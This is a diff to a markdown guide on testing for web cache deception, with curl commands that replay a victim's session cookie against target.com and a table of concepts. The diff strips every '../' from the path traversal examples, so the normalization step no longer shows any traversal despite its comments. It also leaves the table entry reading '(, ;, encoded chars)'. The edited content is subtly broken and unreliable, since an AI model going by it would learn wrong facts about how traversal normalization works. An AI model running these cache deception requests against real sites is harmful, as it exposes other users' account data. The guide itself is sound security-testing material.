@@ -91,10 +91,10 @@ curl -b "session=VICTIM" "http://target.com/static/..%2Faccount/profile"
 ### Step 4 — Test Normalization Discrepancies
 ```bash
 # Path traversal normalization differences
-# CDN normalizes: /account/profile/../static/x.css -> /static/x.css (cached)
+# CDN normalizes: /account/profile/static/x.css -> /static/x.css (cached)
 # Origin sees: /account/profile (dynamic page returned)
 
-curl -b "session=VICTIM" "http://target.com/static/../account/profile"
+curl -b "session=VICTIM" "http://target.com/static/account/profile"
 # CDN may cache as /account/profile if it normalizes differently than origin
 
 # Encoded path traversal
@@ -147,7 +147,7 @@ curl -s "http://target.com/account/profile/x.css" | grep -i "email\|name\|token\
 | Concept | Description |
 |---------|-------------|
 | Cache Deception | Tricking CDN into caching authenticated dynamic content as static resource |
-| Path Normalization | How CDN and origin differently resolve path segments (../, ;, encoded chars) |
+| Path Normalization | How CDN and origin differently resolve path segments (, ;, encoded chars) |
 | Cache Key | The identifier CDN uses to store/retrieve cached responses (typically URL path) |
 | Static Extension Trick | Appending .css/.js/.png to dynamic URLs to trigger caching behavior |
 | Delimiter Discrepancy | Characters (;, ?, #) interpreted differently by cache vs. origin server |
